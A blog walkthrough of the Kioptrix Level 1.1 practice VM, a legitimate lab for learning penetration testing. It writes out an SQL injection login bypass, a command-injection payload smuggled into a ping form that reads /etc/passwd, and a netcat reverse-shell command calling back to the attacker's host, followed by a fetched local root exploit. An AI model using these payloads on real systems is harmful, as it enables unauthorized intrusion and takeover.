---
layout: post
title: Kioptrix Level 1.1 Walkthrough
---
Time to move on to the next challenge labled "Kioptrix 1.1". The attacker uses netdiscover to find the ip of the new target Kioptrix 1.1. 

![Image description](/images/kioptrix1.2.1.png)

The ip of the vulnerable virtual machine is 172.16.158.129. The attacker needed to gather more information about the virtual machine so he used nmap to do a basic scan. 

![Image description](/images/kioptrix1.2.2.png)

Right away he noticed multiple interesting ports to explore. He decided to start with port 80 and he opened up his web browser then pointed it to 172.16.158.129 to see if there are any vulnerable web applications. He is greeted with a login form. 

![Image description](/images/kioptrix1.2.3.png)

He was able to get in with a simple SQL injection.

Login: Admin
Password: ' OR '1'='1

He was then brought to a form that allows you to ping a mahine on the network. He tried pinging local host with cat of /etc/passwd to see what information the forms would post. 

![Image description](/images/kioptrix1.2.7.png)

He was able to display the contents of /etc/passwd for later use. However, he still needed to obtain root. he decided to see if he could obtain a shell in a similar way that he displayed /etc/passwd.

![Image description](/images/kioptrix1.2.14.png)

He set up netcat to listen for any connects on port 9292 and then entered 127.0.0.1;/usr/local/bin/nc 172.16.158.128 9292 -e '/bin/bash' into the webform and obtained a shell. However, he still wasnt root.

![Image description](/images/kioptrix1.2.10.png)

He found a local root exploit but he needed to get it over to kioptrix. He set up a python simple server to host my exploit.

![Image description](/images/kioptrix1.2.13.png)

Then he used wget to get the exploit. 

![Image description](/images/kioptrix1.2.12.png)

He compiled the exploit, and then ran it. Root obtained!

![Image description](/images/kioptrix1.2.11.png)

On to the next challenge!

